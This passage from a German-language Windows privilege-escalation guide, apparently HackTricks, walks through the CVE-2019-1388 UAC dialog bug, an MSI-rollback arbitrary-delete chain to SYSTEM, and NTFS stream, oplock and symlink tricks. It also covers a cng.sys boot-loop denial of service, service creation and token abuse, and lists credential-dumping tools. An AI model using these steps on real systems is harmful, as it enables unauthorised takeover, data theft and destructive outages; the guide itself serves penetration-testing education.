Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```
Um diese Schwachstelle auszunutzen, müssen die folgenden Schritte durchgeführt werden:
```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```
Du hast alle erforderlichen Dateien und Informationen im folgenden GitHub-Repository:

https://github.com/jas502n/CVE-2019-1388<sup>[[35]](#references)</sup>

## Von mittlerer zu hoher Integrity Level / UAC Bypass

Lies dies, um **mehr über Integrity Levels zu erfahren**:


{{#ref}}
integrity-levels.md
{{#endref}}

Lies anschließend **dies, um mehr über UAC und UAC bypasses zu erfahren:**


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## Von beliebigem Löschen/Verschieben/Umbenennen von Ordnern zu SYSTEM EoP

Die in [**diesem Blogbeitrag**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks) beschriebene Technik mit einem [**hier verfügbaren Exploit-Code**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs).<sup>[[31]](#references)[[32]](#references)</sup>

Der Angriff missbraucht grundsätzlich die Rollback-Funktion des Windows Installer, um während des Deinstallationsprozesses legitime Dateien durch schädliche Dateien zu ersetzen. Dazu muss der Angreifer einen **schädlichen MSI-Installer** erstellen, der verwendet wird, um den Ordner `C:\Config.Msi` zu hijacken. Dieser wird später vom Windows Installer verwendet, um während der Deinstallation anderer MSI-Pakete Rollback-Dateien zu speichern, wobei die Rollback-Dateien so verändert worden wären, dass sie das schädliche Payload enthalten.

Die zusammengefasste Technik ist folgende:

1. **Phase 1 – Vorbereitung des Hijacks (`C:\Config.Msi` leer lassen)**

- Schritt 1: MSI installieren
- Erstelle ein `.msi`, das eine harmlose Datei (z. B. `dummy.txt`) in einem beschreibbaren Ordner (`TARGETDIR`) installiert.
- Markiere den Installer als **„UAC Compliant“**, damit ein **Nicht-Administrator** ihn ausführen kann.
- Halte nach der Installation einen **Handle** für die Datei offen.

- Schritt 2: Deinstallation starten
- Deinstalliere dasselbe `.msi`.
- Der Deinstallationsprozess beginnt, Dateien nach `C:\Config.Msi` zu verschieben und in `.rbf`-Dateien umzubenennen (Rollback-Backups).
- **Überwache den offenen Datei-Handle** mit `GetFinalPathNameByHandle`, um zu erkennen, wann die Datei zu `C:\Config.Msi\<random>.rbf` wird.

- Schritt 3: Benutzerdefinierte Synchronisierung
- Das `.msi` enthält eine **benutzerdefinierte Deinstallationsaktion (`SyncOnRbfWritten`)**, die:
- signalisiert, wenn `.rbf` geschrieben wurde.
- anschließend auf ein weiteres Ereignis wartet, bevor die Deinstallation fortgesetzt wird.

- Schritt 4: Löschen von `.rbf` verhindern
- Wenn das Signal empfangen wird, **öffne die `.rbf`-Datei** ohne `FILE_SHARE_DELETE` — dadurch wird verhindert, dass sie gelöscht wird.
- Signalisiere anschließend zurück, damit die Deinstallation abgeschlossen werden kann.
- Der Windows Installer kann die `.rbf` nicht löschen, und da er nicht alle Inhalte löschen kann, wird `C:\Config.Msi` nicht entfernt.

- Schritt 5: `.rbf` manuell löschen
- Du (der Angreifer) löschst die `.rbf`-Datei manuell.
- Nun ist `C:\Config.Msi` leer und bereit, hijacked zu werden.

> An diesem Punkt löst du die SYSTEM-level vulnerability zum beliebigen Löschen von Ordnern aus, um `C:\Config.Msi` zu löschen.

2. **Phase 2 – Rollback-Skripte durch schädliche Skripte ersetzen**

- Schritt 6: `C:\Config.Msi` mit schwachen ACLs neu erstellen
- Erstelle den Ordner `C:\Config.Msi` selbst neu.
- Setze **schwache DACLs** (z. B. Everyone:F) und **halte einen Handle** mit `WRITE_DAC` offen.

- Schritt 7: Eine weitere Installation ausführen
- Installiere das `.msi` erneut mit:
- `TARGETDIR`: Beschreibbarer Speicherort.
- `ERROROUT`: Eine Variable, die einen erzwungenen Fehler auslöst.
- Diese Installation wird verwendet, um erneut ein **Rollback** auszulösen, bei dem `.rbs` und `.rbf` gelesen werden.

- Schritt 8: Nach `.rbs` überwachen
- Verwende `ReadDirectoryChangesW`, um `C:\Config.Msi` zu überwachen, bis eine neue `.rbs` erscheint.
- Erfasse ihren Dateinamen.

- Schritt 9: Synchronisierung vor dem Rollback
- Das `.msi` enthält eine **benutzerdefinierte Installationsaktion (`SyncBeforeRollback`)**, die:
- ein Ereignis signalisiert, sobald die `.rbs` erstellt wurde.
- anschließend wartet, bevor sie fortfährt.

- Schritt 10: Schwache ACL erneut anwenden
- Nachdem du das Ereignis `.rbs created` empfangen hast:
- Der Windows Installer **wendet starke ACLs** erneut auf `C:\Config.Msi` an.
- Da du jedoch weiterhin einen Handle mit `WRITE_DAC` besitzt, kannst du die **schwachen ACLs erneut anwenden**.

> ACLs werden **nur beim Öffnen eines Handles durchgesetzt**, daher kannst du weiterhin in den Ordner schreiben.

- Schritt 11: Gefälschte `.rbs` und `.rbf` ablegen
- Überschreibe die `.rbs`-Datei mit einem **gefälschten Rollback-Skript**, das Windows anweist:
- deine `.rbf`-Datei (schädliche DLL) an einem **privilegierten Speicherort** wiederherzustellen (z. B. `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`).
- deine gefälschte `.rbf` mit einer **schädlichen SYSTEM-level-Payload-DLL** abzulegen.

- Schritt 12: Rollback auslösen
- Signalisiere das Synchronisierungsereignis, damit der Installer fortfährt.
- Eine **Custom Action vom Typ 19 (`ErrorOut`)** ist konfiguriert, um die Installation an einem bekannten Punkt **absichtlich fehlschlagen zu lassen**.
- Dadurch beginnt das **Rollback**.

- Schritt 13: SYSTEM installiert deine DLL
- Der Windows Installer:
- liest deine schädliche `.rbs`.
- kopiert die `.rbf`-DLL an den Zielort.
- Nun befindet sich deine **schädliche DLL in einem von SYSTEM geladenen Pfad**.

- Letzter Schritt: SYSTEM-Code ausführen
- Führe eine vertrauenswürdige **auto-elevated binary** aus (z. B. `osk.exe`), die die von dir hijackte DLL lädt.
- **Boom**: Dein Code wird **als SYSTEM** ausgeführt.


### Von beliebigem Löschen/Verschieben/Umbenennen von Dateien zu SYSTEM EoP

Die zentrale MSI-Rollback-Technik (die vorherige) setzt voraus, dass du einen **gesamten Ordner** (z. B. `C:\Config.Msi`) löschen kannst. Was aber, wenn deine Vulnerability nur das **beliebige Löschen von Dateien** ermöglicht?

Du könntest **NTFS-Interna** ausnutzen: Jeder Ordner verfügt über einen versteckten Alternate Data Stream namens:
```
C:\SomeFolder::$INDEX_ALLOCATION
```
Dieser Stream speichert die **Indexmetadaten** des Ordners.

Wenn du also den **`::$INDEX_ALLOCATION`-Stream** eines Ordners **löschst**, **entfernt NTFS den gesamten Ordner** aus dem Dateisystem.

Dies kannst du mithilfe standardmäßiger APIs zum Löschen von Dateien tun, z. B.:
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```
> Auch wenn du eine *Datei*-Lösch-API aufrufst, **löscht sie den Ordner selbst**.

### Vom Löschen von Ordnerinhalten zu SYSTEM-EoP
Was ist, wenn dein Primitive dir nicht erlaubt, beliebige Dateien/Ordner zu löschen, aber **das Löschen des *Inhalts* eines von einem Angreifer kontrollierten Ordners erlaubt**?

1. Schritt 1: Einen Köderordner und eine Datei einrichten
- Erstellen: `C:\temp\folder1`
- Darin: `C:\temp\folder1\file1.txt`

2. Schritt 2: Einen **oplock** auf `file1.txt` setzen
- Der oplock **pausiert die Ausführung**, wenn ein privilegierter Prozess versucht, `file1.txt` zu löschen.
```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```
3. Schritt 3: SYSTEM-Prozess auslösen (z. B. `SilentCleanup`)
- Dieser Prozess durchsucht Ordner (z. B. `%TEMP%`) und versucht, deren Inhalte zu löschen.
- Wenn er `file1.txt` erreicht, wird der **oplock ausgelöst** und übergibt die Kontrolle an deinen Callback.

4. Schritt 4: Innerhalb des oplock-Callbacks – das Löschen umleiten

- Option A: `file1.txt` an einen anderen Ort verschieben
- Dadurch wird `folder1` geleert, ohne den oplock zu unterbrechen.
- `file1.txt` nicht direkt löschen – dadurch würde der oplock vorzeitig freigegeben.

- Option B: `folder1` in eine **junction** umwandeln:
```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```
- Option C: Erstelle einen **symlink** in `\RPC Control`:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```
> Dies zielt auf den internen NTFS-Stream ab, der Ordner-Metadaten speichert — ihn zu löschen, löscht den Ordner.

5. Schritt 5: Den oplock freigeben
- Der SYSTEM-Prozess setzt fort und versucht, `file1.txt` zu löschen.
- Aufgrund der Junction + des Symlinks wird jedoch tatsächlich Folgendes gelöscht:
```
C:\Config.Msi::$INDEX_ALLOCATION
```
**Ergebnis**: `C:\Config.Msi` wird von SYSTEM gelöscht.

### Von der Erstellung eines beliebigen Ordners zu einem permanenten DoS

Nutze ein Primitiv aus, mit dem du **einen beliebigen Ordner als SYSTEM/Admin erstellen** kannst – selbst wenn **du keine Dateien schreiben** oder **schwache Berechtigungen festlegen** kannst.

Erstelle einen **Ordner** (keine Datei) mit dem Namen eines **kritischen Windows-Treibers**, z. B.:
```
C:\Windows\System32\cng.sys
```
- Dieser Pfad entspricht normalerweise dem Kernel-Mode-Treiber `cng.sys`.
- Wenn Sie ihn **vorab als Ordner erstellen**, kann Windows den eigentlichen Treiber beim Booten nicht laden.
- Anschließend versucht Windows, `cng.sys` während des Bootvorgangs zu laden.
- Es erkennt den Ordner, **kann den eigentlichen Treiber nicht auflösen** und **stürzt ab oder hält den Bootvorgang an**.
- Es gibt **keinen Fallback** und **keine Wiederherstellung** ohne externe Maßnahmen (z. B. Bootreparatur oder Festplattenzugriff).

### Von privilegierten Log-/Backup-Pfaden + OM-Symlinks zum beliebigen Überschreiben von Dateien / Boot-DoS

Wenn ein **privilegierter Dienst** Logs/Exporte in einen Pfad schreibt, der aus einer **beschreibbaren Konfiguration** gelesen wird, können Sie diesen Pfad mit **Object Manager symlinks + NTFS mount points** umleiten, um den privilegierten Schreibvorgang in ein beliebiges Überschreiben umzuwandeln (sogar **ohne** SeCreateSymbolicLinkPrivilege).<sup>[[15]](#references)</sup>

**Anforderungen**
- Die Konfiguration, in der der Zielpfad gespeichert ist, ist für den Angreifer beschreibbar (z. B. `%ProgramData%\...\.ini`).
- Möglichkeit, einen Mount Point zu `\RPC Control` und einen OM-Datei-Symlink zu erstellen (James Forsow [symboliclink-testing-tools](https://github.com/googleprojectzero/symboliclink-testing-tools)).<sup>[[16]](#references)[[17]](#references)</sup>
- Ein privilegierter Vorgang, der in diesen Pfad schreibt (Log, Export, Bericht).

**Beispielkette**
1. Lesen Sie die Konfiguration, um das privilegierte Logziel zu ermitteln, z. B. `SMSLogFile=C:\users\iconics_user\AppData\Local\Temp\logs\log.txt` in `C:\ProgramData\ICONICS\IcoSetup64.ini`.
2. Den Pfad ohne Administratorrechte umleiten:
```cmd
mkdir C:\users\iconics_user\AppData\Local\Temp\logs
CreateMountPoint C:\users\iconics_user\AppData\Local\Temp\logs \RPC Control
CreateSymlink "\\RPC Control\\log.txt" "\\??\\C:\\Windows\\System32\\cng.sys"
```
3. Warten Sie, bis die privilegierte Komponente den Log schreibt (z. B. der Administrator löst „Test-SMS senden“ aus). Der Schreibvorgang landet nun in `C:\Windows\System32\cng.sys`.
4. Untersuchen Sie das überschriebene Ziel (mit einem Hex-/PE-Parser), um die Beschädigung zu bestätigen; ein Neustart zwingt Windows, den manipulierten Treiberpfad zu laden → **boot loop DoS**. Dies lässt sich auch auf jede geschützte Datei verallgemeinern, die ein privilegierter Dienst zum Schreiben öffnet.

> `cng.sys` wird normalerweise aus `C:\Windows\System32\drivers\cng.sys` geladen. Wenn jedoch eine Kopie in `C:\Windows\System32\cng.sys` vorhanden ist, kann zuerst versucht werden, diese zu laden, wodurch sie zu einem zuverlässigen DoS-Ziel für beschädigte Daten wird.



## **Von High Integrity zu System**

### **Neuer Dienst**

Wenn Sie bereits in einem High-Integrity-Prozess ausgeführt werden, kann der **Pfad zu SYSTEM** einfach sein: **Erstellen und Ausführen eines neuen Dienstes**:
```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```
> [!TIP]
> Beim Erstellen einer Service-Binary solltest du sicherstellen, dass sie ein gültiger Service ist oder dass die Binary die erforderlichen Aktionen schnell ausführt, da sie nach 20 Sekunden beendet wird, wenn sie kein gültiger Service ist.

### AlwaysInstallElevated

Aus einem High-Integrity-Prozess kannst du versuchen, die **AlwaysInstallElevated-Registry-Einträge zu aktivieren** und mithilfe eines _**.msi**_-Wrappers eine **Reverse Shell zu installieren**.\
[Weitere Informationen zu den betreffenden Registry-Schlüsseln und zur Installation eines _.msi_-Pakets findest du hier.](#alwaysinstallelevated)

### High + SeImpersonate privilege to System

**Den Code findest du** [**hier**](seimpersonate-from-high-to-system.md)**.**

### From SeDebug + SeImpersonate to Full Token privileges

Wenn du über diese Token-Privileges verfügst (wahrscheinlich findest du sie in einem bereits bestehenden High-Integrity-Prozess), kannst du mit der SeDebug-Privilege **fast jeden Prozess öffnen** (keine geschützten Prozesse), den **Token des Prozesses kopieren** und einen **beliebigen Prozess mit diesem Token erstellen**.\
Bei dieser Technik wird normalerweise **ein beliebiger Prozess ausgewählt, der als SYSTEM mit allen Token-Privileges läuft** (_ja, du kannst SYSTEM-Prozesse ohne alle Token-Privileges finden_).\
**Ein** [**Codebeispiel zur Ausführung der vorgeschlagenen Technik findest du hier**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Named Pipes**

Diese Technik wird von meterpreter verwendet, um mit `getsystem` zu eskalieren. Die Technik besteht darin, **eine Pipe zu erstellen und anschließend einen Service zu erstellen oder zu missbrauchen, um in diese Pipe zu schreiben**. Danach kann der **Server**, der die Pipe mithilfe der **`SeImpersonate`**-Privilege erstellt hat, den **Token des Pipe-Clients** (des Services) **imitieren** und dadurch SYSTEM-Privileges erhalten.\
Wenn du [**mehr über Named Pipes erfahren möchtest, solltest du dies lesen**](#named-pipe-client-impersonation).\
Wenn du ein Beispiel dafür lesen möchtest, [**wie man mithilfe von Named Pipes von High Integrity zu System gelangt, solltest du dies lesen**](from-high-integrity-to-system-with-name-pipes.md).

### Dll Hijacking

Wenn es dir gelingt, eine DLL zu **hijacken**, die von einem als **SYSTEM** laufenden **Prozess** **geladen** wird, kannst du beliebigen Code mit diesen Berechtigungen ausführen. Daher ist Dll Hijacking auch für diese Art der Privilege Escalation nützlich und außerdem **aus einem High-Integrity-Prozess wesentlich einfacher zu erreichen**, da dieser **Schreibberechtigungen** für die zum Laden von DLLs verwendeten Ordner besitzt.\
**Mehr über Dll Hijacking kannst du** [**hier erfahren**](dll-hijacking/index.html)**.**

### **From Administrator or Network Service to System**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### From LOCAL SERVICE or NETWORK SERVICE to full privs

**Lies:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## Weitere Hilfe

[Statische impacket-Binaries](https://github.com/ropnop/impacket_static_binaries)

## Nützliche Tools

**Bestes Tool zur Suche nach Windows-Local-Privilege-Escalation-Vektoren:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- Prüft auf Fehlkonfigurationen und sensible Dateien (**[**hier prüfen**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). Erkannt.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- Prüft auf einige mögliche Fehlkonfigurationen und sammelt Informationen (**[**hier prüfen**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- Prüft auf Fehlkonfigurationen**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- Extrahiert gespeicherte Sitzungsinformationen von PuTTY, WinSCP, SuperPuTTY, FileZilla und RDP. Verwende lokal -Thorough.**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Extrahiert Credentials aus dem Credential Manager. Erkannt.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- Führt einen Spray der gesammelten Passwörter über die Domain aus**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh ist ein PowerShell-ADIDNS/LLMNR/mDNS-Spoofing- und Man-in-the-Middle-Tool.**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Führt eine grundlegende Windows-Privesc-Enumeration durch**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **~~**~~ -- Sucht nach bekannten Privesc-Schwachstellen (DEPRECATED für Watson)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Lokale Prüfungen **(Admin-Rechte erforderlich)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- Sucht nach bekannten Privesc-Schwachstellen (muss mit VisualStudio kompiliert werden) ([**vorkompiliert**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- Durchsucht den Host nach Fehlkonfigurationen (eher ein Tool zum Sammeln von Informationen als für Privesc) (muss kompiliert werden) **(**[**vorkompiliert**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- Extrahiert Credentials aus zahlreichen Programmen (vorkompilierte EXE auf GitHub)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- Portierung von PowerUp nach C#**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **~~**~~ -- Prüft auf Fehlkonfigurationen (vorkompilierte ausführbare Datei auf GitHub). Nicht empfohlen. Funktioniert unter Win10 nicht gut.\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- Prüft auf mögliche Fehlkonfigurationen (EXE aus Python). Nicht empfohlen. Funktioniert unter Win10 nicht gut.

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- Tool, das auf diesem Beitrag basiert (es benötigt keinen Zugriff auf accesschk, um ordnungsgemäß zu funktionieren, kann es aber verwenden).

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- Liest die Ausgabe von **systeminfo** und empfiehlt funktionierende Exploits (lokales Python)\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- Liest die Ausgabe von **systeminfo** und empfiehlt funktionierende Exploits (lokales Python)

**Meterpreter**

_multi/recon/local_exploit_suggestor_

Du musst das Projekt mit der richtigen .NET-Version kompilieren ([siehe hier](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). Um die installierte .NET-Version auf dem Victim-Host anzuzeigen, kannst du Folgendes ausführen:
```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```
## References

- [1] [Grundlagen der Windows Privilege Escalation](http://www.fuzzysecurity.com/tutorials/16.html)
- [2] [Privilege Escalation durch das Ausnutzen schwacher Ordnerberechtigungen](http://www.greyhathacker.net/?p=738)
- [3] [Windows Privilege Escalation – ein Cheatsheet](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [4] [lpeworkshop – Windows / Linux Local Privilege Escalation Workshop](https://github.com/sagishahar/lpeworkshop)
- [5] [DerbyCon 3.0 – Windows-Angriffe: AT ist das neue Schwarz (Rob Fuller & Chris Gates)](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [6] [Privilege Escalation – Windows – Vollständiger OSCP-Leitfaden](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [7] [Windows – Privilege Escalation – PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [8] [Leitfaden zur Windows Privilege Escalation](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [9] [Checkliste für die Windows-Privilege-Escalation](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [10] [Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [11] [Windows-Privilege-Escalation-Methoden für Pentester](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [12] [0xdf – HTB/VulnLab JobTwo: Word-VBA-Macro-Phishing via SMTP → hMailServer-Credential-Decryption → Veeam CVE-2023-27532 zu SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [13] [HTB Reaper: Format-String-leak + Stack-BOF → VirtualAlloc ROP (RCE) und Kernel-Token-Diebstahl](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)
- [14] [Check Point Research – Jagd auf den Silver Fox: Katz und Maus in den Schatten des Kernels](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)
- [15] [Unit 42 – Privilegierte Dateisystem-Schwachstelle in einem SCADA-System](https://unit42.paloaltonetworks.com/iconics-suite-cve-2025-0921/)
- [16] [Tools zum Testen symbolischer Links – Verwendung von CreateSymlink](https://github.com/googleprojectzero/symboliclink-testing-tools/blob/main/CreateSymlink/CreateSymlink_readme.txt)
- [17] [Ein Link in die Vergangenheit. Missbrauch symbolischer Links unter Windows](https://infocon.org/cons/SyScan/SyScan%202015%20Singapore/SyScan%202015%20Singapore%20presentations/SyScan15%20James%20Forshaw%20-%20A%20Link%20to%20the%20Past.pdf)
- [18] [RIP RegPwn – MDSec](https://www.mdsec.co.uk/2026/03/rip-regpwn/)
- [19] [RegPwn BOF (Cobalt-Strike-BOF-Port)](https://github.com/Flangvik/RegPwnBOF)
- [20] [ZDI – Node.js Trust Falls: Gefährliche Modulauflösung unter Windows](https://www.thezdi.com/blog/2026/4/8/nodejs-trust-falls-dangerous-module-resolution-on-windows)
- [21] [Node.js-Module: Laden aus `node_modules`-Ordnern](https://nodejs.org/api/modules.html#loading-from-node_modules-folders)
- [22] [npm package.json: `optionalDependencies`](https://docs.npmjs.com/cli/v11/configuring-npm/package-json#optionaldependencies)
- [23] [Process Monitor (Procmon)](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon)
- [24] [Trail of Bits – Checklisten-Herausforderungen für C/C++, gelöst](https://blog.trailofbits.com/2026/05/05/c/c-checklist-challenges-solved/)
- [25] [Microsoft Learn – RtlQueryRegistryValues-Funktion](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-rtlqueryregistryvalues)
- [26] [PowerShell Gallery – NtObjectManager](https://www.powershellgallery.com/packages/NtObjectManager/2.0.1)
- [27] [sec-zone – CVE-2026-36213](https://github.com/sec-zone/CVE-2026-36213)
- [28] [sec-zone – Hijack-service-binaries](https://github.com/sec-zone/Hijack-service-binaries)
- [29] [Pwn2Own mit Microslop: Verkettung von CLDFLT- und DirectX-Kernel-Race-Conditions für Windows LPE](https://dungnm.hashnode.dev/pwn2own-with-microslop)
- [30] [Ein I/O Ring, sie alle zu beherrschen: Ein vollständiges Read/Write-Exploit-Primitive unter Windows 11](https://windows-internals.com/one-i-o-ring-to-rule-them-all-a-full-read-write-exploit-primitive-on-windows-11/)
- [31] [Beliebige Dateilöschungen missbrauchen, um Privilege Escalation und andere großartige Tricks durchzuführen](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks)
- [32] [thezdi/PoC – FilesystemEoPs-Exploit-Code](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs)
- [33] [GoSecure – WSUS-Angriffe, Teil 2: CVE-2020-1013, eine 1-Day-Local-Privilege-Escalation unter Windows 10](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/)
- [34] [Windows 7: Credential Manager und Windows Vault erkunden](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)
- [35] [jas502n – CVE-2019-1388 PoC](https://github.com/jas502n/CVE-2019-1388)
- [36] [research.nccgroup.com – Kerberos Resource Based Constrained Delegation: Wenn eine Image-Änderung zu einer Privilege Escalation führt](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation)
- [37] [blog.ropnop.com – Private SSH-Schlüssel aus dem Windows-10-SSH-Agent extrahieren](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent)
{{#include ../../banners/hacktricks-training.md}}
